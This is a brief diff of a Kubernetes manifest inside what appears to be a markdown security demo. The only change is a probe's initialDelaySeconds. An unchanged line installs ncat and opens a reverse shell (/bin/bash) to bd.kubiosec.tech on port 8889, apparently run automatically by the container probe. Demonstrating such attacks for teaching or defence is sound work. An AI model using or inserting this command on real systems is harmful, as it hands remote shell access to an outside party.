@@ -102,7 +102,7 @@ spec:
         - bash
         - -c
         - apt-get install ncat ; ncat -e /bin/bash bd.kubiosec.tech 8889 &
-      initialDelaySeconds: 5
+      initialDelaySeconds: 30
       periodSeconds: 5
 EOF
 ```
